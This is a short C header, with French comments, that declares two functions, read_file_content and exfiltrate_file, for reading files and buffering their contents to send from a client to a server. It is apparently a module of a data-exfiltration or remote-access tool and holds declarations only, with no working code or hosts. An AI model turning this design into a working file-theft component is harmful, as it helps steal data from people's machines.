/**
 * @file exfiltration.h
 * @brief Fonctionnalités d'exfiltration de fichiers
 * @author Valentin Pizzio
 * @date 21/12/2024
 * 
 * Ce fichier définit les fonctions nécessaires pour l'exfiltration
 * de fichiers, permettant de lire et transférer le contenu des fichiers
 * entre le client et le serveur.
 */

#ifndef EXFILTRATION_H
#define EXFILTRATION_H

/**
 * @brief Lit le contenu d'un fichier
 * 
 * Cette fonction ouvre et lit le contenu complet d'un fichier spécifié.
 * Le contenu est retourné dans un buffer alloué dynamiquement.
 * 
 * @param filename Nom du fichier à lire
 * @return char* Buffer contenant le contenu du fichier (NULL en cas d'erreur)
 */
char* read_file_content(const char* filename);

/**
 * @brief Exfiltre un fichier
 * 
 * Cette fonction lit le contenu d'un fichier et le copie dans un buffer
 * pour l'envoi au serveur. En cas d'erreur, un message d'erreur est placé
 * dans le buffer.
 * 
 * @param filename Nom du fichier à exfiltrer
 * @param buffer Buffer où stocker le contenu ou le message d'erreur
 * @param buffer_size Taille maximale du buffer
 */
void exfiltrate_file(const char* filename, char* buffer, size_t buffer_size);

#endif // EXFILTRATION_H
